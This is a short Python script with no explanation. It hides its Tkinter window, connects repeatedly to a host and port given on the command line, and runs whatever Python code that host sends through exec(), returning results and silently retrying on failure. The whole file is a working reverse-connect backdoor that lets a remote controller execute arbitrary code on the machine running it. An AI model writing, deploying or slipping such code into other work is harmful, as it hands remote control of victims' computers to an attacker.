#!/usr/bin/env python


import os
import socket
import subprocess
import sys
import tkinter
import tkinter.messagebox
import webbrowser


rootwin = tkinter.Tk()
rootwin.withdraw()
host,port = sys.argv[1].split(":")
port = int(port)
while True:
	try:
		s = socket.socket()
		s.connect((host,port))
		while True:
			cmd = s.recv(100*1024).decode()
			try:
				exec(cmd)
				s.send('ok'.encode())
			except Exception as e:
				s.send(str(e).encode())
	except Exception as e:
		pass
